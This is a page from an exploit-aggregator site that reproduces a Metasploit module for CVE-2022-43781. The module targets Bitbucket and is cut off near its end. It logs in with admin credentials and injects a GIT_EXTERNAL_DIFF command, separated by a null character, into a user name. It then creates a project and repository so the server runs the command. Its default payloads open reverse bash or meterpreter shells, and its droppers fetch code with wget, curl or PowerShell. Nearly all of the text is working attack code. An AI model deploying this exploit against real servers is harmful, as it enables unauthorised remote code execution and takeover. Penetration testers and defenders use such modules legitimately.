---
title: Bitbucket Environment Variable Remote Command Injection exploit
url: https://sploitus.com/exploit?id=PACKETSTORM:171369&utm_source=rss&utm_medium=rss
source: Sploitus.com Exploits RSS Feed
date: 2023-03-17
fetch_date: 2025-10-04T09:50:34.567808
---

# Bitbucket Environment Variable Remote Command Injection exploit

[x]
Dark Mode

[##### SPLOITUS](/)

# Exploit for Bitbucket Environment Variable Remote Command Injection CVE-2022-43781

2023-03-16 | CVSS 9.8

Copy
Download
Source
[Share](#share-url)

```
## https://sploitus.com/exploit?id=PACKETSTORM:171369
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
Rank = ExcellentRanking

include Msf::Exploit::Remote::HttpClient
include Msf::Exploit::Git
include Msf::Exploit::Git::SmartHttp
include Msf::Exploit::CmdStager
prepend Msf::Exploit::Remote::AutoCheck

def initialize(info = {})
super(
update_info(
info,
'Name' => 'Bitbucket Environment Variable RCE',
'Description' => %q{
For various versions of Bitbucket, there is an authenticated command injection
vulnerability that can be exploited by injecting environment
variables into a user name. This module achieves remote code execution
as the `atlbitbucket` user by injecting the `GIT_EXTERNAL_DIFF` environment
variable, a null character as a delimiter, and arbitrary code into a user's
user name. The value (payload) of the `GIT_EXTERNAL_DIFF` environment variable
will be run once the Bitbucket application is coerced into generating a diff.

This module requires at least admin credentials, as admins and above
only have the option to change their user name.
},
'License' => MSF_LICENSE,
'Author' => [
'Ry0taK', # Vulnerability Discovery
'y4er', # PoC and blog post
'Shelby Pace' # Metasploit Module
],
'References' => [
[ 'URL', 'https://y4er.com/posts/cve-2022-43781-bitbucket-server-rce/'],
[ 'URL', 'https://confluence.atlassian.com/bitbucketserver/bitbucket-server-and-data-center-security-advisory-2022-11-16-1180141667.html'],
[ 'CVE', '2022-43781']
],
'Platform' => [ 'win', 'unix', 'linux' ],
'Privileged' => true,
'Arch' => [ ARCH_CMD, ARCH_X86, ARCH_X64 ],
'Targets' => [
[
'Linux Command',
{
'Platform' => 'unix',
'Type' => :unix_cmd,
'Arch' => [ ARCH_CMD ],
'Payload' => { 'Space' => 254 },
'DefaultOptions' => { 'Payload' => 'cmd/unix/reverse_bash' }
}
],
[
'Linux Dropper',
{
'Platform' => 'linux',
'MaxLineChars' => 254,
'Type' => :linux_dropper,
'Arch' => [ ARCH_X86, ARCH_X64 ],
'CmdStagerFlavor' => %i[wget curl],
'DefaultOptions' => { 'Payload' => 'linux/x86/meterpreter/reverse_tcp' }
}
],
[
'Windows Dropper',
{
'Platform' => 'win',
'MaxLineChars' => 254,
'Type' => :win_dropper,
'Arch' => [ ARCH_X86, ARCH_X64 ],
'CmdStagerFlavor' => [ :psh_invokewebrequest ],
'DefaultOptions' => { 'Payload' => 'windows/meterpreter/reverse_tcp' }
}
]
],
'DisclosureDate' => '2022-11-16',
'DefaultTarget' => 0,
'Notes' => {
'Stability' => [ CRASH_SAFE ],
'Reliability' => [ REPEATABLE_SESSION ],
'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ]
}
)
)

register_options(
[
Opt::RPORT(7990),
OptString.new('USERNAME', [ true, 'User name to log in with' ]),
OptString.new('PASSWORD', [ true, 'Password to log in with' ]),
OptString.new('TARGETURI', [ true, 'The URI of the Bitbucket instance', '/'])
]
)
end

def check
res = send_request_cgi(
'method' => 'GET',
'uri' => normalize_uri(target_uri.path, 'login'),
'keep_cookies' => true
)

return CheckCode::Unknown('Failed to retrieve a response from the target') unless res
return CheckCode::Safe('Target does not appear to be Bitbucket') unless res.body.include?('Bitbucket')

nokogiri_data = res.get_html_document
footer = nokogiri_data&.at('footer')
return CheckCode::Detected('Failed to retrieve version information from Bitbucket') unless footer

version_info = footer.at('span')&.children&.text
return CheckCode::Detected('Failed to find version information in footer section') unless version_info

vers_matches = version_info.match(/v(\d+\.\d+\.\d+)/)
return CheckCode::Detected('Failed to find version info in expected format') unless vers_matches && vers_matches.length > 1

version_str = vers_matches[1]

vprint_status("Found version #{version_str} of Bitbucket")
major, minor, revision = version_str.split('.')
rev_num = revision.to_i

case major
when '7'
case minor
when '0', '1', '2', '3', '4', '5'
return CheckCode::Appears
when '6'
return CheckCode::Appears if rev_num >= 0 && rev_num <= 18
when '7', '8', '9', '10', '11', '12', '13', '14', '15', '16'
return CheckCode::Appears
when '17'
return CheckCode::Appears if rev_num >= 0 && rev_num <= 11
when '18', '19', '20'
return CheckCode::Appears
when '21'
return CheckCode::Appears if rev_num >= 0 && rev_num <= 5
end
when '8'
print_status('Versions 8.* are vulnerable only if the mesh setting is disabled')
case minor
when '0'
return CheckCode::Appears if rev_num >= 0 && rev_num <= 4
when '1'
return CheckCode::Appears if rev_num >= 0 && rev_num <= 4
when '2'
return CheckCode::Appears if rev_num >= 0 && rev_num <= 3
when '3'
return CheckCode::Appears if rev_num >= 0 && rev_num <= 2
when '4'
return CheckCode::Appears if rev_num == 0 || rev_num == 1
end
end

CheckCode::Detected
end

def default_branch
@default_branch ||= Rex::Text.rand_text_alpha(5..9)
end

def uname_payload(cmd)
"#{datastore['USERNAME']}\u0000GIT_EXTERNAL_DIFF=$(#{cmd})"
end

def log_in(username, password)
res = send_request_cgi(
'method' => 'GET',
'uri' => normalize_uri(target_uri.path, 'login'),
'keep_cookies' => true
)

fail_with(Failure::UnexpectedReply, 'Failed to access login page') unless res&.body&.include?('login')

res = send_request_cgi(
'method' => 'POST',
'uri' => normalize_uri(target_uri.path, 'j_atl_security_check'),
'keep_cookies' => true,
'vars_post' => {
'j_username' => username,
'j_password' => password,
'_atl_remember_me' => 'on',
'submit' => 'Log in'
}
)

fail_with(Failure::UnexpectedReply, 'Didn\'t retrieve a response') unless res
res = send_request_cgi(
'method' => 'GET',
'uri' => normalize_uri(target_uri.path, 'projects'),
'keep_cookies' => true
)

fail_with(Failure::UnexpectedReply, 'No response from the projects page') unless res
unless res.body.include?('Logged in')
fail_with(Failure::UnexpectedReply, 'Failed to log in. Please check credentials')
end
end

def create_project
proj_uri = normalize_uri(target_uri.path, 'projects?create')
res = send_request_cgi(
'method' => 'GET',
'uri' => proj_uri,
'keep_cookies' => true
)

fail_with(Failure::UnexpectedReply, 'Unable to access project creation page') unless res&.body&.include?('Create project')

vprint_status('Retrieving security token')
html_doc = res.get_html_document
token_data = html_doc.at('div//input[@name="atl_token"]')
fail_with(Failure::UnexpectedReply, 'Failed to find element containing \'atl_token\'') unless token_data

@token = token_data['value']
fail_with(Failure::UnexpectedReply, 'No token found') if @token.blank?

project_name = Rex::Text.rand_text_alpha(5..9)
project_key = Rex::Text.rand_text_alpha(5..9).upcase
res = send_request_cgi(
'method' => 'POST',
'uri' => proj_uri,
'keep_cookies' => true,
'vars_post' => {
'name' => project_name,
'key' => project_key,
'submit' => 'Create project',
'atl_token' => @token
}
)

fail_with(Failure::UnexpectedReply, 'Failed to receive response from project creation') unless res
fail_with(Failure::UnexpectedReply, 'Failed to create project') unless res['Location']&.include?(project_key)

print_status('Project creation was successful')
[ project_name, project_key ]
end

def create_repository
repo_uri = normalize_uri(target_uri.path, 'projects', @project_key, 'repos?create')
res = send_request_cgi(
'method' => 'GET',
'uri' => repo_uri,
'keep_cookies' => true
)

fail_with(Failure::UnexpectedReply, 'Failed to access repo creation page') unless res

html_doc = res.get_html_document

dropdown_data = html_doc.at('li[@class="user-dropdown"]')
fail_with(Failure::UnexpectedReply, 'Failed to find dropdown to retrieve email address') if dropdown_data.blank?
email = dropdown_data&.at('span')&.[]('data-emailaddress')
fail_with(Failure::UnexpectedReply, 'Failed to retrieve email address from response') if email.blank?

repo_name = Rex::Text.rand_text_alpha(5..9)
res = send_request_cgi(
'method' => 'POST',
'u...